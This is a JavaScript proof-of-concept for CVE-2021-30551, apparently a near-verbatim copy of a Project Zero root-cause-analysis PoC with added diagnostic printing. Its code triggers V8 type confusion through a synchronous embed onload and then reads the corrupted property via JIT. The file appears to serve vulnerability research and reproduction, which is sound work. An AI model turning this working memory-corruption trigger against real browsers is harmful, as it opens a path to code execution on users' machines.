// CVE-2021-30551 — Project Zero RCA minimal PoC, verbatim apart from print shims
// and diagnostics. Source: googleprojectzero 0day-RCAs/2021/CVE-2021-30551.
//
// The vital mechanic: the embed's property interceptor triggers a SYNCHRONOUS
// subframe load, so the onload handler runs *inside* the property assignment.
// That is what lets the handler define the property which SetPropertyInternal
// then fails to notice. If `onload` were asynchronous here the bug would not
// fire, so the diagnostics record whether a handler ran while the assignment was
// still on the stack.
var print = (typeof print === 'function') ? print : function () { };

var firedInside = 0;
var inAssignment = false;

function hexOf(v) {
  var b = new ArrayBuffer(8), d = new Float64Array(b), u = new Uint32Array(b);
  d[0] = Number(v);
  return u[1].toString(16) + ':' + u[0].toString(16);
}

global_object = {};

setPropertyViaEmbed = (object, value, handler) => {
  const embed = document.createElement('embed');
  embed.onload = handler;
  embed.type = 'text/html';
  Object.setPrototypeOf(global_object, embed);
  document.body.appendChild(embed);
  inAssignment = true;
  object.corrupted_prop = value;
  inAssignment = false;
  embed.remove();
};

createCorruptedPair = (value_1, value_2) => {
  const object_1 = { __proto__: global_object };
  object_1.regular_prop = 1;

  setPropertyViaEmbed(object_1, value_2, () => {
    if (inAssignment) { firedInside++; }
    Object.setPrototypeOf(global_object, null);
    object_1.corrupted_prop = value_1;
  });

  const object_2 = { __proto__: global_object };
  object_2.regular_prop = 1;

  setPropertyViaEmbed(object_2, value_2, () => {
    if (inAssignment) { firedInside++; }
    Object.setPrototypeOf(global_object, null);
    object_2.corrupted_prop = value_1;
    object_1.regular_prop = 1.1;
  });
  return [object_1, object_2];
};

const array = [1.1];
array.prop = 1;

print('[+]pair-start');
const [object_1, object_2] = createCorruptedPair(array, 2261620.509803918);
print('[+]pair-done firedInside=' + firedInside);

jit = (object) => {
  return object.corrupted_prop[0];
};

function describe(label, o) {
  var t = typeof o;
  var own = 'n/a';
  try { own = Object.getOwnPropertyNames(o).join(','); } catch (e) { own = 'err'; }
  var proto = 'null';
  try { proto = o.__proto__ === null ? 'null' : typeof o.__proto__; } catch (e) { proto = 'err'; }
  print('[+]' + label + ' typeof=' + t + ' own=[' + own + '] proto=' + proto);
}
describe('obj1', object_1);
describe('obj2', object_2);
describe('cp1-value', object_1.corrupted_prop);
describe('cp2-value', object_2.corrupted_prop);
print('[+]warmup-start');
for (var i = 0; i < 100000; ++i) { jit(object_1); }
print('[+]warmup-done');

try {
  var r = jit(object_2);
  print('[+]jit-object2 type=' + (typeof r) + ' hex=' + hexOf(r) + ' num=' + Number(r));
} catch (e) {
  print('[+]jit-threw ' + e.name + ': ' + e.message);
}

var seen = [];
for (var k = 0; k < 5; k++) {
  try { seen.push(hexOf(jit(object_2))); } catch (e) { seen.push('threw'); }
}
print('[+]repeat ' + seen.join(' '));

try {
  print('[+]cp0=' + hexOf(object_2.corrupted_prop[0]) +
        ' len=' + object_2.corrupted_prop.length);
} catch (e) { print('[+]cp-threw ' + e.name); }
print('[+]rca-done');
